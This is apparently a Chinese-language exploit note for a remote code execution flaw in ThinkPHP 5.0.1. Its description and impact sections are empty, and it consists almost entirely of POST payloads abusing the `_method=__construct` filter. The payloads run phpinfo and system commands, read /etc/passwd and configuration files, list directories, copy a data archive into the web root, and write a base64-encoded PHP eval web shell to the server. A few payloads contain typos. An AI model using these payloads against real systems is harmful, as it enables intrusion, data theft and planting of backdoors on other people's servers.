Thinkphp 5.0.1
==============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、判断是否存在漏洞

#### poc1

    http://wwww.com/public

    s=phpinfo()&_method=__construct&filter=assert
    _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo
    _method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
    _method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1

#### poc2

    http:/xxxx.com/?s=index/index/index

    s=ipconfig&_mehthod=__construct$method=&filter[]=system

### 2、深入利用

使用post提交

#### 1、使用assert函数

    s=phpinfo()&_method=__construct&filter=assert

#### 2、include函数，可以根据此函数查看一些文件及其配置

    s=include("/etc/passwd")&_method=__construct&filter=assert

#### 3、file\_put\_contents函数，可以直接写入文件

    s=file_put_contents('/data/wwwroot/www.0-sec.org/application/index/test.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4'))&_method=__construct&filter=assert

#### 4、读取文件

    _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../application/.htaccess
    s=include("../application/.htaccess")&_method=__construct&filter=assert

    //ps:如果不加.. 请加上完整路径

#### 5、var\_dump函数，可以查看该路径下的文件，文件夹

    s=var_dump(scandir('../application/'))&_method=__construct&filter=assert

#### 6、复制文件

    s=copy("/data/wwwroot/data.tar", "/data/wwwroot/www.0-sec.org/public/data.tar")&_method=__construct&filter=asser
